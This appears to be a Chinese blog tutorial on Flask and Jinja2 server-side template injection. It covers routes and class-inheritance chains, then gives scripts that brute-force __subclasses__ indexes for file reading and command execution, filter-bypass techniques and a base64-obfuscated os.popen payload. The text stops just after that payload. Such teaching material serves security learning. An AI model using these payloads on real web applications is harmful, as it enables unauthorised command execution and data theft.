<p><img src="https://img-blog.csdnimg.cn/4c4bda8917ad457b8be45f8e97bb41e4.png" alt="123"></p>
<h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>PUT方法用于向服务器更新数据。在Flask中，我们可以通过route装饰器将PUT路由关联到视图函数。以下是一个简单的PUT路由示例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">update_user</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    json_data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    name <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
    email <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>
    <span class="token comment"># ... code to update user ...</span>
    <span class="token keyword">return</span> <span class="token string">'User updated successfully'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/bc07498f2db246ac8a70637a9a6cb6b2.png" alt="456"></p>
<h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>DELETE方法用于从服务器删除数据。在Flask中，我们可以通过route装饰器将DELETE路由关联到视图函数。以下是一个简单的DELETE路由示例：</p>
<pre class="line-numbers language-pyhon" data-language="pyhon"><code class="language-pyhon">from flask import Flask

app &#x3D; Flask(__name__)

@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;, methods&#x3D;[&#39;DELETE&#39;])
def delete_user(id):
    # ... code to delete user ...
    return &#39;User deleted successfully&#39;

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    app.run(debug&#x3D;True,host&#x3D;&#39;0.0.0.0&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/97c43ec5172743e5b3b20c1f0095ccb8.png" alt="789"></p>
<h2 id="Flask模板介绍"><a href="#Flask模板介绍" class="headerlink" title="Flask模板介绍"></a>Flask模板介绍</h2><p>介绍：<a href="https://blog.csdn.net/weixin_42577686/article/details/124524571">Flask模板的介绍与使用</a><br><img src="https://img-blog.csdnimg.cn/2bb1224d9c574e6abbfbfa4cf27108f1.png" alt="46"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span>request

app<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    my_str<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ben'</span><span class="token punctuation">)</span>
    my_int<span class="token operator">=</span><span class="token number">123</span>
    my_array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>
    my_dict<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'daming'</span><span class="token punctuation">,</span>
        <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">18</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>my_str<span class="token operator">=</span>my_str<span class="token punctuation">,</span>my_int<span class="token operator">=</span>my_int<span class="token punctuation">,</span>my_array<span class="token operator">=</span>my_array<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">#创建一个目录templates，目录下创建文件index.html
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
模板html展示页面
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
&#123;&#123;my_str&#125;&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/38258db68de7475aa1b8956574a62d0c.png" alt="456"></p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="https://img-blog.csdnimg.cn/a18c5bfd821244b4aa43c18c4d6fbbd2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/da03c4e385134b32b89dad29d09e8b47.png" alt="456"></p>
<h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><p><img src="https://img-blog.csdnimg.cn/977f7e20ead84e11ad7203444a349bbc.png" alt="456"><br>在 python 中，类之间是会有继承关系的，也就是派生类（子类）与基类（父类）的关系，这可以理解为父子关系。在这个父子关系中的最高级，就是 object 。也就是说，object 是祖宗类。<br>一般来说，SSTI 构造 payload 的思想，就是要通过各个数据类型 Numbers（数字）String（字符串）List（列表）Tuple（元组）Dictionary（字典） 这些子类，一直往上找到 object ，然后再通过找 object 类可以利用的子类。可以利用的子类，就是这个子类的方法（popen() eval()等方法）或属性可以利用。</p>
<p>写一个代码理解一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为A的空类</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为B的类，它继承自A类</span>
<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为C的类，它继承自B类</span>
<span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为D的类，它继承自B类</span>
c<span class="token operator">=</span>C<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建了一个C类的实例c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里将C类实例化为一个对象，打印出实例c的类对象</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token comment"># __class__ 是一个特殊的属性，用于获取对象的类</span>
<span class="token comment">#结果&lt;class '__main__.C'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
<span class="token comment">#结果&lt;class '__main__.B'></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
<span class="token comment">#结果&lt;class '__main__.A'></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span>
<span class="token comment">#结果&lt;class 'object'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最终指向就是Object<br>还有一种方法可以去显示出来</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span><span class="token comment"># __mro__ 是一个特殊的属性，用于获取一个类或实例的方法解析顺序（Method Resolution Order</span>
<span class="token comment">#结果(&lt;class '__main__.C'>, &lt;class '__main__.B'>, &lt;class '__main__.A'>, &lt;class 'object'>)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#结果 &lt;class '__main__.C'></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#结果 &lt;class '__main__.B'></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/a6a4c1b498844cbfa0315f7a38647fa1.png" alt="123"></p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">__dict__ 保存类实例或对象实例的属性变量键值对字典
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="检查漏洞"><a href="#检查漏洞" class="headerlink" title="检查漏洞"></a>检查漏洞</h3><p><img src="https://img-blog.csdnimg.cn/caeb1dcd2e444e3889a444e1dba2c909.png" alt="546"><br><img src="https://img-blog.csdnimg.cn/d6d9edfdac9a48c0a5d30ce2ceca4a32.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/bdc2dafed414478985d6ed6fabec0e45.png" alt="456"></p>
<h3 id="常用注入模块"><a href="#常用注入模块" class="headerlink" title="常用注入模块"></a>常用注入模块</h3><p><img src="https://img-blog.csdnimg.cn/3dec8eda7ce74583aaae7bacab9cdb0d.png" alt="123"></p>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>python脚本：POST提交”name“的值，通过for循环查找所需字符串</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入URL链接：'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class__.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]&#125;&#125;"</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#print(response.text)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">'_frozen_importlib_external.FileLoader'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            	<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>脚本灵活运用，按照实际情况修改<br><img src="https://img-blog.csdnimg.cn/75239b4fe04e4ce3b6eb5b55bc11f334.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/df0ff4b811074b499ae0fef8df76734f.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/306d33271c3341f68d9922a4f308591d.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb63bef8c10341eea65da7ec1eb02690.png" alt="123"></p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>内建函数：python在执行脚本时自动加载的函数<br>脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入URL链接：'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__['__builtins__']&#125;&#125;"</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#print(response.text)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/6721439df92e49ac8f19f59ef2a72dee.png" alt="123"></p>
<p><code>&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</code><br>显示出当前目录有哪些内置的对象和函数<br><img src="https://img-blog.csdnimg.cn/52affb08455e46979134e9f9007df484.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/fb950d9977db4dbf8b5cdd198d375543.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/3b890900c6e64a8cb894283d4f54549e.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/8318ba4390ef4d55ba6180f9e3d72d71.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb210962dd7946399de23043c7bcc9c2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/7e6bbbaf4ace4c32b4e022a06cb73dd6.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/2f7da1b5b3e94582ba7e48918c73d01d.png" alt="123"></p>
<h3 id="绕过过滤双大括号"><a href="#绕过过滤双大括号" class="headerlink" title="绕过过滤双大括号"></a>绕过过滤双大括号</h3><p><img src="https://img-blog.csdnimg.cn/843f81905523465d81afb8d2ca8c14e7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/44f353805abf4973bc97d424f7055dc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9e890759aafd44ee880e1d2449eed86b.png" alt="456"></p>
<p><img src="https://img-blog.csdnimg.cn/0a11a96296bb45e8b97038bd17f989f4.png" alt="456"></p>
<h3 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h3><p><img src="https://img-blog.csdnimg.cn/82b05ea854bd43c4a6689747d03aaf90.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/58f91b0ea44945efbea06531fa8d0c18.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/d3ccb83ee5d84e29b3439bda5ccc472b.png" alt="789"></p>
<p><img src="https://img-blog.csdnimg.cn/672ebb6c2fc04b70a944b1a5adeb2000.png" alt="123"></p>
<h3 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h3><p> 正常使用<code>[]</code>时<br><code> &#123;&#123;''.__calss__.__base__.subclasses__()[117]&#125;&#125;</code><br>使用getitem绕过<br><code>&#123;&#123;''.__calss__.__base__.subclasses__().__getitem__(117)&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/a9db3d6fefeb43b79b67cba773b9b35f.png" alt="123"></p>
<h3 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h3><p><img src="https://img-blog.csdnimg.cn/0498fbef7bdf44af8fb9901a42397b70.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/0d25651fb09747b58d80bf62fd7a4924.png" alt="123"> <img src="https://img-blog.csdnimg.cn/4fa2f3bb6f31499ca1cd233021e76b3a.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2a5b3fea2be4f459debf419da9c668d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/9725d59f92c6414fa6bf79e987ef8d41.png" alt="456"></p>
<h3 id="过滤器绕过下划线过滤"><a href="#过滤器绕过下划线过滤" class="headerlink" title="过滤器绕过下划线过滤"></a>过滤器绕过下划线过滤</h3><p><img src="https://img-blog.csdnimg.cn/c94604ff42234859be94be5fd95995d1.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9f77f111586a4a7bb36576882e392bd0.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/e54f250d97794204bd0ea7a7a5358e8d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/a9ab18ed669941afa2e9ab7a3a000480.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2605697c1f0494baff5ae23a6195692.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/d50175a108264f048e38e4162bf25d2d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/766e77f05f154194bf82a7b2e5298e03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2bcf11b047e348c8b4d36ddd1b71af40.png" alt="789"></p>
<h3 id="中括号绕过点过滤"><a href="#中括号绕过点过滤" class="headerlink" title="中括号绕过点过滤"></a>中括号绕过点过滤</h3><p><img src="https://img-blog.csdnimg.cn/07a73d95f15949b994c50dda1355bdaf.png" alt="789"></p>
<h3 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h3><p><img src="https://img-blog.csdnimg.cn/b02c0b719d1b4b40b62593daad6508cf.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/b1ec1ebc3718402da007db1d5536e12a.png" alt="12"><br><img src="https://img-blog.csdnimg.cn/bc9d91b3c45e487ebe7d2383a52f3712.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/3de5244222804c66bd3d90b90516d6d6.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2b1365da13f84927bcc32e37cbbf1943.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/fd34e24cf8dc4bcf9ca6d47d4f506abe.png" alt="456"></p>
<h3 id="绕过数字过滤"><a href="#绕过数字过滤" class="headerlink" title="绕过数字过滤"></a>绕过数字过滤</h3><p>示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.html
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
        <span class="token selector">.a</span><span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
        <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
字符串个数：&#123;% set a='aaaaaaaaaa'|length*'aa'|length*'aaa'|length %&#125;&#123;&#123;a&#125;&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/3bcdac20b4a846b3945e7b554d5f895d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/b283f0cd960f429ca31a672895b41f01.png" alt="789"></p>
<h3 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h3><p><img src="https://img-blog.csdnimg.cn/096ab7cca0394d75830c6f465f6800c1.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/a69000736d8e432f84ce4e62a303cd6f.png" alt="12"></p>
<h3 id="混合过滤绕过介绍"><a href="#混合过滤绕过介绍" class="headerlink" title="混合过滤绕过介绍"></a>混合过滤绕过介绍</h3><p><img src="https://img-blog.csdnimg.cn/231c722768454962b8d3b5b9360ae042.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/28fd166d9ea84690a33cff39bad5ef03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/282904a4d77e4dbb85f30e50c7107eba.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/106950159e194978829bfc6bc54bf80a.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/d537cb382c8b4dda9f06968f8630da2f.png" alt="123"></p>
<h4 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="利用编码绕过"></a>利用编码绕过</h4><p>我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'X19idWlsdGluc19f'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ZXZhbA=='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>等同于：</p>
